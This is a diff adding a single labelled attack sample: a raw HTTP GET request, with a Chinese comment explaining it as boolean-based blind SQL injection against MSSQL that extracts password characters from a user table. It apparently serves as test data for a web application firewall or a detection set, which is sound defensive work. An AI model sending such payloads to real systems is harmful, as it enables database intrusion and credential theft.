@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_布尔注入-06506456
+# 攻击者基于布尔查询，将"ascii(substring((select top 1 cast(password as varchar) from test.user where password not in (select top 1 id from test.user)),1,1))>10"语句注入到 SQL 查询参数中，通过substring()函数提取字符，在转换成ascii值进行比较，逐个字符爆破test数据库中user表中password列中第一行数据的字符值。
+GET /?id=1%20and%20ascii%28substring%28%28select%20top%201%20cast%28password%20as%20varchar%29%20from%20test.user%20where%20password%20not%20in%20%28select%20top%201%20id%20from%20test.user%29%29%2C1%2C1%29%29%3E10&bid=hd_tag_m8mv26me HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26me
+RM-PRO-Token: 7fe7a36adce32c448111f4045d9f5ec5
+RM-PRO-Time: 1742808636458
+User-Agent: curl/7.83.1
+
